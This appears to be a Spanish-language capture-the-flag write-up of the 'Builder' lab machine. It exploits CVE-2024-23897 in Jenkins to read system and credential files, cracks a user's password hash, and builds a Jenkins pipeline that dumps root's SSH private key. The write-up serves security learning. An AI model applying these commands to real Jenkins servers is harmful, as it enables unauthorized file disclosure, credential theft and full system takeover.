#by d4l1

<p align="center"><img src="https://github.com/user-attachments/assets/2e74501b-e6df-4d0b-89e3-1f6bd4194b76"></p>
<h1 align="center">BUILDER</h1>

# ÍNDICE

- [INICIO]
- [ENUMERACION]
- 

# INICIO

Nos encontramos con la máquina Builder, una máquina de dificultad media, en la que encontrarmemos una vulnerabilidad con el CVE-2024-23897 sobre desautentificación de usuarios y leeremos archivos arbitrariosdel sistema para tomar el control. Deberemos xtraer el usuario y contraseña del usuario "Jennifer". Usar esas crendeciales, coger una SSH key y obtener acceso root al sistema

## HABILIDADES REQUERIDAS

- Enumeracion
- Docker

## HABILIDADES QUE APRENDEREMOS

- Explotar CVE-2024-23897
- Estructura de directorio Jenkins
- Criptografia Jenkins

# ENUMERACION

Como siempre haremos un test de conectividad:

![image](https://github.com/user-attachments/assets/904ac6e8-847a-402a-8145-2276c2de6db4)

ttl = 63 (Linux)

Posteriormente escaneo de puertos:

![image](https://github.com/user-attachments/assets/b7f7816e-2c67-4d7c-9ea0-03690942f7c1)

Nos encontramos con:

- Puerto 22 abierto (SSH) Ubuntu
- Puerto 8080 abierto (HTTP) Jetty 10.0.18

![image](https://github.com/user-attachments/assets/5ff9d0bf-a66e-4c5f-91fd-0f04756b071d)

Nos encontramos con una página web con Jenkins 2.441 vamos a explorar.

Vamos a buscar una vulnerabilidad de "Jenkins 2.441"

Nos encontramos con : [CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------)

Nos explican un poco sobre Jenkins, es un server automatico de código abierto. Ayuda a automatizar partes del software para los desarolladores haciendo testing, construición, implementaciones, etc.

Esta vulnerabilidad nos deja leer archivos del sistema

```
python3 script.py -u http://10.10.11.10:8080/ -f /etc/passwd

```
# INTRODUCCIÓN AL SISTEMA

Una vez que confirmamos que el exploit funciona, vamos a enumerar los elementos de la instalación de Jenkins en la ruta "/proc/self/environ"
```
HOSTNAME=0f52c222a4cc<SNIP>HOME=/var/jenkins_home<SNIP>
```
Leyendo estas variables, encontramos que el directorio home esta en "/var/jenkins_home"

![image](https://github.com/user-attachments/assets/524d632a-4c1e-48bf-af25-593fdbf63169)

Tenemos la user.txt

Si nos damos cuenta la variable "HOSTNAME" no especifica un "builder" o algo similar, los caracteres randomizados usualmente se indica que es un contenedor Docker.

Nuestra mejor opción es crear un docker local de el repositorio oficial de jenkins

```
docker pull jenkins/jenkins:lts-jdk17
docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
```

Una vez todo correcto nos conectamos a nuestra instancia "http://127.0.0.1:8080"

![image](https://github.com/user-attachments/assets/94339f1e-b333-463a-a127-5cc38bda9bef)

elegimos que queremos instalarlo pero en normal

![image](https://github.com/user-attachments/assets/489bb7ea-4a21-49e6-b3b7-e9e516f53b1b)

![image](https://github.com/user-attachments/assets/a53c8408-7f41-49ae-a913-1086ccf722cf)

En la siguiente pagina tenemos la instancia de la configuracion hacemos que no ahora y nos salimos

```
docker ps -a
docker start 63c
docker exec -it 63c bash
```

Nos conectamos dentro y buscamos rutas

```
cd
ls
ls users
cat users/users.xml
```

Hemos encontrado la ruta del directorio de nuestros usuarios, dentro de ella encontramos una rchivo "config.xml" 

```
cat users/amra_5955286986173787020/config.xml
```

Ahora que sabemos que tenemos la disponibilidad de extraer una contraseña y los usuarios vamo a hacer lo mismo pero arbitrariamente

```
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080'
help "@/var/jenkins_home/users/users.xml"
```

![image](https://github.com/user-attachments/assets/d080d597-eca9-4bff-996e-551d5cefd279)

Vemos que este archivo no existe, o quizas el comando "help" no extrae las dos primeras lineas vamos a utilizar el comando "connect-node"

![image](https://github.com/user-attachments/assets/79a2f97f-1eaf-4617-8f9b-906fa21d3cd3)

Lo tenemos

Ahora nos vamos a la configuracion de el usaurio "jennifer"

![image](https://github.com/user-attachments/assets/4a80a176-9b41-4c33-b352-b7c76b80e002)

tenemos el hash vamos a cogerlo y con john intentarlo crackear

![image](https://github.com/user-attachments/assets/0278f55b-8215-4466-88d2-6ca656bad292)

Tenemos usuario y contraseña jennifer:pricess

Vamos a meternos a la página web con esos credenciales.

![image](https://github.com/user-attachments/assets/349ae4d8-4f96-42c1-8887-892e34b9e0ec)

# ESCALA DE PRIVILEGIOS

Viendo como funciona Jenkis, nosotros podemos coger credenciales guardas con el nombre root.

![image](https://github.com/user-attachments/assets/d365284c-c304-4d96-b858-938e629abfa9)

Esta credencial es una key de ssh, tenemos que mirar plugins o alguno instalado para cogerlo 

![image](https://github.com/user-attachments/assets/b52113d5-01b9-4729-beec-9b5578466d07)

Esto hace que craftene comandos para poder usar SSH. VAmos a chekear si la ssh es valida del usuario root.

Vamos a crear un nuevo item "pipeline"

![image](https://github.com/user-attachments/assets/fc80000e-d8ab-4a42-ba4d-ad861b15e999)

Dentro de la sección ponemos que lea la key de ssh
```
pipeline {
agent any
stages {
stage('SSH') {
steps {
script {
sshagent(credentials: ['1']) {
sh 'ssh -o StrictHostKeyChecking=no root@10.129.230.220
"cat /root/.ssh/id_rsa"'
}
}
}
}
}
}
```

![image](https://github.com/user-attachments/assets/47ae12c5-f8bd-4c43-955a-c77003dba684)

Lo guardamos y pulsamos sobre "Build Now" y vemos el output de la consola

![image](https://github.com/user-attachments/assets/46540f00-1f7c-4da1-9d7e-c038dc89b232)

La tenemos 

![image](https://github.com/user-attachments/assets/3dbc24b1-82bf-4006-a7fb-59869be4dd2c)

Estamos dentro GG

![image](https://github.com/user-attachments/assets/7fcb6e26-61bd-4df0-84fa-3d9c43b5aa44)



